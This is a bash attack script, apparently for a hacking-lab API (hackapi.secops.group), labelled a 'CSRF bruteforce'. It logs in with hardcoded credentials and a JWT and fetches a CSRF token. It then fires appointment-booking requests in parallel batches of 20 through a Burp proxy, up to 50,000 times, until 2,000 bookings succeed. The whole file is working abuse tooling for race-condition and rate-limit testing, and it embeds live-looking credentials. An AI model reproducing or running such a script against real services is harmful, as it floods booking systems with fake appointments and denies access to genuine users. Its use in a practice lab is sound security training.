#!/bin/bash

GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET_201=2000
BATCH_SIZE=20
MAX_ATTEMPTS=50000
BURP_PROXY='http://127.0.0.1:8001'
AUTH_URL='https://hackapi.secops.group/api/v2/auth'
APPOINTMENT_URL='https://hackapi.secops.group/api/v2/appointment'
AUTH_BODY='{"email":"john4@healthcare.app","password":"john@1234"}'
APPT_BODY='{"slot":"2024-12-15T10:00:00","notes":"Need consultation for fever"}'
AUTH_TOKEN='Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ImpvaG4xMjM0IiwiZW1haWwiOiJqb2huNEBoZWFsdGhjYXJlLmFwcCJ9.U9RPrQ8mxw0rNwG4UfGqFYVEIZS5OZz-xqaiT9S9phk'

TMPDIR=$(mktemp -d)
RESULTS_DIR="results"
mkdir -p "$RESULTS_DIR"
HIT_FILE="$RESULTS_DIR/http_201_hits.txt"
> "$HIT_FILE"

cleanup() {
    rm -rf "$TMPDIR"
}

trap cleanup EXIT

request_once() {
    local attempt="$1"
    local auth_response csrf_token appointment_response response_code

    auth_response=$(curl -s -k --proxy "$BURP_PROXY" --connect-timeout 5 --max-time 20 \
        -X POST -H 'Content-Type: application/json' -H 'Accept: application/json' \
        --data-binary "$AUTH_BODY" "$AUTH_URL" 2>/dev/null)

    csrf_token=$(printf '%s' "$auth_response" | awk 'BEGIN{IGNORECASE=1} /^X-CSRF-Token:/ {sub(/\r/,"",$2); print $2; exit}')
    [ -z "$csrf_token" ] && return 1

    appointment_response=$(curl -s -k --proxy "$BURP_PROXY" --connect-timeout 5 --max-time 20 \
        -X POST \
        -H "X-CSRF-Token: $csrf_token" \
        -H 'Content-Type: application/json' \
        -H 'Accept: application/json' \
        -H "$AUTH_TOKEN" \
        --data-binary "$APPT_BODY" "$APPOINTMENT_URL" 2>/dev/null)

    response_code=$(printf '%s' "$appointment_response" | awk 'NR==1 {print $2}')
    if [ "$response_code" = "201" ]; then
        printf '%s\n' "$attempt" >> "$HIT_FILE"
        printf '\n[%s] HTTP 201\n%s\n' "$attempt" "$(printf '%s' "$appointment_response" | awk 'NR>1 {print}' | head -12)"
    fi
}

count_201() {
    wc -l < "$HIT_FILE" | tr -d ' '
}

echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] CSRF bruteforce por lotes de 20${NC}"
echo -e "${BLUE}[*] Batch: $BATCH_SIZE | Target 201: $TARGET_201 | Max attempts: $MAX_ATTEMPTS${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}\n"

start_time=$(date +%s)
attempt=0

while [ "$(count_201)" -lt "$TARGET_201" ] && [ "$attempt" -lt "$MAX_ATTEMPTS" ]; do
    pids=()
    for _ in $(seq 1 "$BATCH_SIZE"); do
        attempt=$((attempt + 1))
        [ "$attempt" -gt "$MAX_ATTEMPTS" ] && break
        request_once "$attempt" &
        pids+=("$!")
    done

    for pid in "${pids[@]}"; do
        wait "$pid"
    done

    current_201=$(count_201)
    elapsed=$(( $(date +%s) - start_time ))
    echo -e "${BLUE}[~] Attempts: $attempt | HTTP 201: $current_201/$TARGET_201 | Tiempo: ${elapsed}s${NC}"
done

total_time=$(( $(date +%s) - start_time ))
http_201_count=$(count_201)

echo -e "\n${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] Tiempo total: ${total_time}s${NC}"
echo -e "${BLUE}[*] HTTP 201: ${http_201_count}${NC}"
if [ "$http_201_count" -ge "$TARGET_201" ]; then
    echo -e "${GREEN}[+] Objetivo alcanzado${NC}"
else
    echo -e "${RED}[!] Objetivo no alcanzado${NC}"
fi
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
